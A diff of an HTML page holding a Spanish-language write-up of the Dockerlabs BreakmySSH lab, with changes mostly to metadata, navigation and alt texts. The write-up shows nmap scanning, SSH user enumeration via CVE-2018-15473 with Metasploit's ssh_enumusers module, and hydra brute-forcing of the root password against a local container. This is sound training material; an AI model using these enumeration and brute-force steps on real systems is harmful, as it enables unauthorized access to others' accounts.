@@ -2,9 +2,15 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <title>GoodGames HTB - Writeup</title>
+  <title>BreakmySSH Docker - Writeup</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <link rel="stylesheet" href="../styles.css" />
+  <meta name="description" content="Writeup de BreakmySSH (Dockerlabs): enumeración de usuarios vía CVE-2018-15473 en OpenSSH 7.7 y fuerza bruta con Hydra." />
+  <meta name="color-scheme" content="dark" />
+  <link rel="icon" href="../img/avatar.png" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="../styles.css?v=3" />
 </head>
 <body>
   <div class="post-layout">
@@ -16,9 +22,8 @@
       <p class="sidebar-role">HTB - Docker Player</p>
 
       <ul class="sidebar-list">
-        <li>HTB</li>
-        <li>Web · Linux</li>
-        <li></li>
+        <li>Docker</li>
+        <li>Linux</li>
       </ul>
 
       <ul class="sidebar-links">
@@ -26,36 +31,48 @@
         <li><a href="https://twitter.com">Twitter</a></li>
         <li><a href="https://github.com/JeinerGutierrez">GitHub</a></li>
       </ul>
+
+      <a class="back-home" href="../index.html">&larr; Volver a Writeups</a>
     </aside>
 
     <main class="post-main">
       <header class="post-header">
-        <p class="post-breadcrumb">Home / BreakmySSH Docker - Writeup</p>
+        <p class="post-breadcrumb"><a href="../index.html">Home</a> / BreakmySSH Docker - Writeup</p>
         <h1 class="post-title">BreakmySSH Docker - Writeup</h1>
-        <p class="post-date">Jun 09, 2026 · Linux </p>
+        <p class="post-date">Jun 09, 2026 · <span class="pill">Linux</span> <span class="pill">SSH</span></p>
       </header>
 
+      <nav class="post-toc" aria-label="Contenido del writeup">
+        <h2>En este writeup</h2>
+        <ol class="post-index">
+          <li><a href="#init">1. Inicialización de la máquina</a></li>
+          <li><a href="#enumeracion">2. Enumeración inicial</a></li>
+          <li><a href="#investigacion">3. Investigación</a></li>
+          <li><a href="#explotacion">4. Explotación</a></li>
+          <li><a href="#ssh">5. Acceso por SSH</a></li>
+        </ol>
+      </nav>
 
       <section class="post-section">
         <h2>El día de hoy vamos a resolver la maquina BreakmySSH de Docker. Es una maquina Linux </h2>
-        <img src="breakmyssh/img-maquina2.png" alt="Tu foto" />
-        <h2>1. Inicialización de la maquina</h2>
+        <img src="breakmyssh/img-maquina2.png" alt="Ficha de la máquina BreakmySSH de Dockerlabs" />
+        <h2 id="init">1. Inicialización de la maquina</h2>
         <p>Lo primero será descargar la maquina de Dockerlabs, una vez lo tengamos descargado lo movemos a una nueva carpeta y lo descomprimimos.</p>
-        <img src="breakmyssh/img-unzip.png" alt="Tu foto" />
+        <img src="breakmyssh/img-unzip.png" alt="Descomprimiendo el archivo de la máquina BreakmySSH" />
         <p>Luego corremos la maquina con el siguiente comando: </p>
         <pre><code>sudo bash auto_deploy.sh breakmyssh.tar  </code></pre>
-        <img src="breakmyssh/img-bash1.png" alt="Tu foto" />
-        <h2>2. Enumeración inicial</h2>
+        <img src="breakmyssh/img-bash1.png" alt="Despliegue del contenedor BreakmySSH con auto_deploy.sh" />
+        <h2 id="enumeracion">2. Enumeración inicial</h2>
         <p>Lo primero será un escaneo de puertos usando la herramienta nmap:</p>
         <pre><code>sudo nmap -p- -sV -sC  -T5 --min-rate 5000 -Pn 172.17.0.2</code></pre>
-        <img src="breakmyssh/img-nmap.png" alt="Tu foto" />
+        <img src="breakmyssh/img-nmap.png" alt="Resultado de nmap mostrando el puerto 22 (SSH) abierto" />
         <p>Podemos ver que el puerto 22 (SSH) está abierto. </p>
-        <h2>3. investigación </h2>
+        <h2 id="investigacion">3. investigación </h2>
         <p>Como podemos ver el servicio que está corriendo es OpenSSH con la versión 7.7, investigaremos un poco sobre esta versión.</p>
-        <img src="breakmyssh/img-vulne.png" alt="Tu foto" />
+        <img src="breakmyssh/img-vulne.png" alt="Búsqueda de vulnerabilidades conocidas para OpenSSH 7.7" />
         <p>Tras la investigación podemos ver que hay una vulnerabilidad en la versión 7.7 (CVE-2018-15473), OpenSSH 7.7 es propenso a una vulnerabilidad de enumeración de usuarios. Usaremos esto como puerta de entrada. </p>
         <p>Usaremos la herramienta de Metasploit para explotar esta vulnerabilidad. </p>
-        <h2>4. Explotación </h2>
+        <h2 id="explotacion">4. Explotación </h2>
         <p>Usaremos los siguientes comandos: </p>
         <pre><code>msfconsole</code></pre>
         <p>* Esto sirve para iniciar Metasploit.</p>
@@ -63,7 +80,7 @@
         <p>* Esto sirve para buscar vulnerabilidades de enumeración.</p>
         <pre><code>use 4 (Depende del número donde se encuentre "auxiliary/scanner/ssh/ssh_enumusers")</code></pre>
         <p>* Esto sirve para seleccionar el modulo que vamos a usar para explotar la vulnerabilidad.</p>
-        <img src="breakmyssh/img-metas.png" alt="Tu foto" />
+        <img src="breakmyssh/img-metas.png" alt="Módulo auxiliary/scanner/ssh/ssh_enumusers seleccionado en Metasploit" />
         <p>Luego usaremos:</p>
         <pre><code>show options  </code></pre>
         <p>* Esto sirve para ver las configuraciones, así saber lo que tenemos que configurar.</p>
@@ -72,18 +89,18 @@
         <p>* Esto sirve para asignar la IP objetivo a la cual vamos a vulnerar.</p>
         <pre><code>set USER_FILE /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt  </code></pre>
         <p>* Esto sirve para asignar la ruta del diccionario que usará.</p>
-        <img src="breakmyssh/img-show.png" alt="Tu foto" />
+        <img src="breakmyssh/img-show.png" alt="Opciones RHOSTS y USER_FILE configuradas en el módulo de Metasploit" />
         <pre><code>Finalmente volvemos escribir show options para ver los cambios que hicimos y escribimos: </code></pre>
         <pre><code>run</code></pre>
         <p>* Esto sirve para comenzar con la explotación.</p>
-        <img src="breakmyssh/img-run.png" alt="Tu foto" />
-        <h2>5. Acceso por SSH </h2>
+        <img src="breakmyssh/img-run.png" alt="Metasploit enumerando usuarios válidos por SSH" />
+        <h2 id="ssh">5. Acceso por SSH </h2>
         <p>Teniendo la lista de usuarios podemos probar con uno de ellos, en este caso usaremos el usuario "root", como no tenemos la contraseña la podemos obtener usando fuerza bruta con herramientas como hydra o john the ripper.</p>
         <p>Usaremos hydra con el siguiente comando:</p>
         <pre><code>hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2</code></pre>
-        <img src="breakmyssh/img-hydra.png" alt="Tu foto" />
+        <img src="breakmyssh/img-hydra.png" alt="Hydra encontrando la contraseña del usuario root por fuerza bruta" />
         <p>Como vemos se logró conseguir la contraseña del usuario root, ahora podemos acceder por SSH.</p>
-        <img src="breakmyssh/img-sshgood.png" alt="Tu foto" />
+        <img src="breakmyssh/img-sshgood.png" alt="Acceso SSH exitoso como root en BreakmySSH" />
         <p>Finalmente se logró acceder por ssh.</p>
 
         
